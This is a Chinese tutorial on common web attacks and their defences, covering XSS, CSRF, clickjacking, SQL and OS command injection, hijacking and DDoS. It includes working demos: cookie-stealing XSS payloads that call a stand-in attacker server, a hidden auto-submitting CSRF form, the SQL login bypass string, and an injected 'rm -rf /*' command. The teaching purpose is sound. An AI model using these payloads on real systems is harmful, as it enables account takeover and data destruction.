# 常见Web攻击

## 课堂⽬标

掌握XSS (实施 + 防御) 

掌握CSRF (实施 + 防御) 

掌握点击劫持 (实施 + 防御) 

掌握SQL注⼊ (实施 + 防御) 

掌握OS注⼊ (实施 + 防御) 

了解请求劫持

了解DDOS



## 知识要点

### 1、XSS

XSS 攻击的基本逻辑：在 URL 中插入一段 script 脚本，然后脚本的 src 设置成另一个网址（黑客网址）或者设置一段 JS 代码，然后插入一张图片，图片的 src 中包括当前用户的登录信息（document.cookie）这样在黑客平台上可以获取到用户的 cookie，然后可以直接登录用户的账户。图片通常会加载，所以写入图片的 src 中。 `<img src="http://localhost:4000?test:${document.cookie}"/>` 类似这样的脚本。

黑客发给别人一个网址，然后点击网址进入的界面中，就可能有非法的脚本。



Cross Site Scripting 跨站脚本攻击

XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻 击是指通过存在安全漏漏洞洞的Web⽹网站注册⽤户的浏览器器内运⾏⾮非法的⾮非本站点HTML标签或 JavaScript进⾏的⼀一种攻击。

~~~js
var img = new Image();
img.src = 'http://localhost:4000/img?c=' + document.cookie;
~~~

加入这段代码后，会将浏览器的 cookie 获取到，然后图片会请求 4000 端口（黑客端口）可以解析一下获取到 cookie，黑客就可以进行正常的登录了

~~~js
localhost:3000/?from=<script%20src="http://localhost:4000/hack.js"></script>
~~~

跨站脚本攻击有可能造成以下影响:

利利⽤虚假输⼊表单骗取⽤户个⼈人信息。

利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。

显示伪造的⽂章或图片。

### XSS攻击分类

- 反射型 - url参数直接注⼊（攻击一个用户的账户）

~~~js
// 普通
http://localhost:3000/?from=china

// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>

// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>

// 短域名伪造(用户无法直接看清楚原来的长网站中是否有 script 标签)
https://dwz.cn/console/operation 百度随便搜索就有

// 伪造 cookie ⼊侵 chrome 
document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUz NTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
~~~

- 存储型 （直接攻击数据库，然后其他人执行时会直接发布） 黑客输入一个含有病毒的评论，存储到DB后，其他正常用户读取时中毒，获取用户的浏览器 cookie，然后继续传播

~~~html
// 评论
<script>alert(1)</script>

// 跨站脚本注⼊
我来了<script src="http://localhost:4000/hack.js"></script>
~~~

### XSS攻击的危害 - Scripting能干啥就能干啥

获取⻚面数据 获取Cookies 劫持前端逻辑

发送请求

偷取网站的任意数据

偷取⽤户的资料

偷取⽤户的秘密和登录态

欺骗⽤户

### XSS 防范⼿段

#### HEAD

0 禁止XSS过滤

1 启⽤XSS过滤(通常浏览器器是默认的)。 如果检测到跨站脚本攻击，浏览器器将清除⻚页⾯面(删除不不 安全的部分)

~~~js
ctx.set('X-XSS-Protection', 0) // 禁⽌止XSS过滤
// http://localhost:3000/?from=<script>alert(3)</script> 可以拦截 但伪装一下就不⾏ 了
~~~

1;mode=block 启⽤XSS过滤。 如果检测到攻击，浏览器器将不不会清除⻚页⾯面，⽽而是阻⽌止⻚页⾯面加载。 1; report= (Chromium only)

启⽤XSS过滤。 如果检测到跨站脚本攻击，浏览器器将清除⻚页⾯面并使⽤CSP report-uri 指令的功 能发送违规报告。

#### CSP

内容安全策略略 (CSP, Content Security Policy) 是⼀一个附加的安全层，⽤于帮助检测和缓解某 些类型的攻击，包括跨站脚本 (XSS) 和数据注⼊等攻击。 这些攻击可⽤于实现从数据窃取到 ⽹网站破坏或作为恶意软件分发版本等⽤途。

CSP 本质上就是建⽴立⽩名单，开发者明确告诉浏览器器哪些外部资源可以加载和执⾏。我们只 需要配置规则，如何拦截是由浏览器器⾃自⼰己实现的。我们可以通过这种⽅式来尽量量减少 XSS 攻 击。

~~~js
// 只允许加载本站资源
Content-Security-Policy: default-src 'self'

// 只允许加载 HTTPS 协议图⽚
Content-Security-Policy: img-src https://*

// 不不允许加载任何来源框架
Content-Security-Policy: child-src 'none'

ctx.set('Content-Security-Policy', "default-src 'self'")
// 尝试⼀一下外部资源不不能加载
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
~~~

#### 转义字符

ejs转义⼩知识

~~~ejs
<% code %>⽤于执⾏其中javascript代码;
<%= code %>会对code进⾏html转义;
<%- code %>将不不会进⾏转义
~~~

#### 黑名单

⽤户的输⼊永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜杠
进⾏转义

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```

 富⽂本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对
 于这种情况，通常采⽤⽩名单过滤的办法，当然也可以通过⿊黑名单过滤，但是考虑到需要过滤的
 标签和标签属性实在太多，更加推荐使⽤⽩名单的⽅式。

#### ⽩名单

~~~js
const xss = require('xss')
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
console.log(html)
~~~

#### HttpOnly Cookie

这是预防XSS攻击窃取⽤户cookie最有效的防御⼿段。Web应 ⽤程序在设置cookie时，将其 属性设为HttpOnly，就可以避免该⽹网⻚页的cookie被客户端恶意JavaScript窃取，保护⽤户 cookie 信息。

```js
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
```



### 2、CSRF

> CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀一种常⻅见的Web攻击，它利⽤⽤户已登录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作。

- ⽤户已经登录了站点 A，并在本地记录了 cookie
- 在⽤户没有登出站点 A 的情况下(也就是 cookie ⽣生效的情况下)，访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。
- 站点 A 没有做任何 CSRF 防御

登录 http://localhost:4000/csrf.html 主要使用 iframe 嵌套另一个页面

~~~js
document.write(`
	<form name="form" action="http://3000/updateText" method="post" target="csrf">
		添加评论: <input type="text" name="text" value="comment"/>
	</form>
`)

var iframe = document.createElement('iframe');
iframe.name = 'csrf';
iframe.style.display = 'none';
document.body.appendChild(iframe);

setTimeout(function() {
  document.querySelector(form).submit();
}, 1000);
~~~

用户点开这个链接后，已经在 3000 网站上登录，不知情的情况下（iframe 不显示），那么就会给 3000 网站上发出一个评论，评论的内容会发送到 3000 上面，造成虚假的评论。或者评论内部有其他非法代码，其他用户在 3000 上看到这个评论，就会获取其他用户的信息。或者在评论中插入4000的链接，诱导其他用户点击4000链接。

这个表单提交后，target 需要设置一下，不会跳转到其他页面，用户不知不觉中提交了表单

所以某些服务端会判断当前提交的是 iframe 还是 window，或者只允许自己的域下的页面提交表单或者评论。

#### CSRF攻击危害


利⽤⽤户登录态
⽤户不知情
完成业务请求
盗取⽤户资金(转账，消费)
冒充⽤户发帖背锅
损害⽹站声誉

#### 防御

- 禁⽌止第三⽅⽹网站带Cookie - 有兼容性问题 Referer Check - Https不不发送referer

~~~js
app.use(async (ctx, next) => {
    await next()
		const referer = ctx.request.header.referer
    console.log('Referer:', referer)
})
~~~

- 验证码
- Cookie 值进行hash



### 3、点击劫持 - clickjacking

点击劫持是⼀一种视觉欺骗的攻击⼿段。攻击者将需要攻击的⽹网站通过 iframe 嵌套的⽅式嵌⼊⾃⼰的网页中，并将 iframe 设置为透明，在⻚页⾯面中透出⼀一个按钮诱导⽤户点击。

登录 http://localhost:4000/clickjacking.html

我们在页面中注入一个 iframe，然后设置透明，用户无法看到。然后在弄一个图片（美女或者抢红包）用户会点击这个图片，实际上点击的是 iframe 中的内容（例如投票按钮），这样用户就被点击劫持了。

~~~html
<button>点我领红包</button>
<img src="./red-pocket.png"/>
<iframe src="http://localhost:3000" scrolling="no"></iframe>
~~~

~~~css
iframe {
  opacity: 0;
}
button: {
  position: absolute;
  top: xxx;
  left: xxx;
}
~~~

#### 防御

- X-FRAME-OPTIONS是⼀一个 HTTP 响应头，在现代浏览器器有⼀一个很好的⽀持。这个 HTTP 响应头 就是为了防御⽤ iframe 嵌套的点击劫持攻击。 该响应头有三个值可选，分别是DENY，表示⻚页⾯面不不允许通过 iframe 的⽅式展示 SAMEORIGIN，表示⻚页⾯面可以在相同域名下通过 iframe 的⽅式展示 ALLOW-FROM，表示⻚页⾯面可以在指定来源的 iframe 中展示

```js
ctx.set('X-FRAME-OPTIONS', 'DENY')
```

- JS⽅式，判断当时是否存在 iframe，如果存在 iframe，那么就把 iframe 当做现在的窗口，就不会显示攻击者的窗口了。

```html
<head>
  <style id="click-jack">
    html {
      display: none !important;
    }
  </style>
</head>
<body>
  <script>
    // self 是自己 == window
    // top 返回顶层窗口（浏览器窗口）
    if (self == top) {
      var style = document.getElementById('click-jack')
      document.body.removeChild(style)
    } else {
      top.location = self.location
    }
  </script>
</body>
```

以上代码的作⽤就是当通过 iframe 的⽅式加载⻚页⾯面时，攻击者的⽹网⻚页直接不不显示所有内容了。 



### SQL注⼊

例如登录页面，如果直接把用户名和密码作为 SQL 语句参数去执行，那么可以这样注入

~~~sql
# 填⼊特殊密码 1'or'1'='1

# 拼接后的SQL
SELECT * FROM test.user WHERE username = 'laowang' AND password = '1'or'

 # 实际上 where 有了 or 1'='1' 
 # 始终返回真，就登录成功了
~~~

#### 防御

所有的查询语句建议使⽤数据库提供的参数化查询接口，参数化的语句使⽤参数，而不是将⽤户 输⼊变量嵌⼊到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query ⽅法中的 ? 占位参数。

```js
// 错误写法
const sql = ` SELECT * FROM test.user WHERE username = '${ctx.request.body.username}' AND password = '${ctx.request.body.password}'`;
console.log('sql', sql)
res = await query(sql)

//正确的写法
const sql = 'SELECT * FROM test.user WHERE username = ? AND password = ?';
console.log('sql', sql, )
res = await query(sql, [ctx.request.body.username, ctx.request.body.password]);
```

严格限制Web应⽤的数据库的操作权限，给此⽤户提供仅能够满足其工作的最低权限，从⽽而 最大限度的减少注⼊攻击对数据库的危害 后端代码检查输⼊的数据是否符合预期，严格限制变量量的类型，例如使⽤正则表达式进⾏一些匹配处理。

对进⼊数据库的特殊字符('，"，\，<，>，&，*，; 等)进⾏转义处理，或编码转换。基本上所有的后端语⾔言都有对字符串串进⾏转义处理的⽅法，⽐比如 lodash 的 lodash._escapehtmlchar 库。



### OS注⼊

OS命令注⼊和SQL注⼊差不不多，只不不过SQL注⼊是针对数据库的，⽽而OS命令注⼊是针对操作系统的。OS命令 注⼊攻击指通过Web应⽤，执⾏⾮非法的操作系统命令达到攻击的⽬目的。只要在能调⽤Shell函数的地⽅就有 存在被攻击的⻛风险。倘若调⽤Shell时存在疏漏漏，就可以执⾏插⼊的⾮非法命令。

~~~js
// 以 Node.js 为例例，假如在接⼝口中需要从 github 下载⽤户指定的 repo const exec = require('mz/child_process').exec;
let params = {/* ⽤户输⼊的参数 */};
exec(`git clone ${params.repo} /some/path`);
~~~

如果传⼊的参数是会怎样

```
  https://github.com/xx/xx.git && rm -rf /* &&
```



### 请求劫持

- DNS劫持 顾名思义，DNS服务器器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不不是预期的ip
- HTTP劫持 运营商劫持，此时⼤大概只能升级HTTPS了

### DDOS

http://www.ruanyifeng.com/blog/2018/06/ddos.html 阮阮⼀一峰

distributed denial of service

DDOS 不不是⼀一种攻击，⽽而是⼀一⼤大类攻击的总称。它有⼏几⼗十种类型，新的攻击⽅法还在不不断发明出来。⽹网 站运⾏的各个环节，都可以是攻击⽬目标。只要把⼀一个环节攻破，使得整个流程跑不不起来，就达到了瘫痪 服务的⽬目的。

其中，⽐比较常⻅见的⼀一种攻击是 cc 攻击。它就是简单粗暴暴地送来⼤大量量正常的请求，超出服务器器的最⼤大承 受量量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤大概20多个 IP 地址轮流发出请求，每个地 址的请求量量在每秒200次~300次。我看访问⽇日志的时候，就觉得那些请求像洪⽔水⼀一样涌来，⼀一眨眼就是 ⼀一⼤大堆，⼏几分钟的时间，⽇日志⽂文件的体积就⼤大了100MB。说实话，这只能算⼩攻击，但是我的个⼈人⽹网站 没有任何防护，服务器器还是跟其他⼈人共享的，这种流量量⼀一来⽴立刻就下线了。

常⻅见攻击⽅式

SYN Flood

此攻击通过向⽬目标发送具有欺骗性源IP地址的⼤大量量TCP“初始连接请求”SYN数据包来利利⽤TCP握 ⼿。⽬目标机器器响应每个连接请求，然后等待握⼿中的最后⼀一步，这⼀一步从未发⽣生过，耗尽了进程 中的⽬目标资源。

HTTP Flood

此攻击类似于同时在多个不不同计算机上反复按Web浏览器器中的刷新 - ⼤大量量HTTP请求泛滥服务器器， 导致拒绝服务。

防御⼿段

\- 备份⽹网站 备份⽹网站不不⼀一定是全功能的，如果能做到全静态浏览，就能满⾜足需求。最低限度应该可以显示公告，告诉⽤户，⽹网站出了问题，正在全⼒力力抢修。
 \- HTTP 请求的拦截 ⾼防IP -靠谱的运营商 多个 Docker

硬件 服务器器 防⽕火墙 - 带宽扩容 + CDN

提⾼犯罪成本

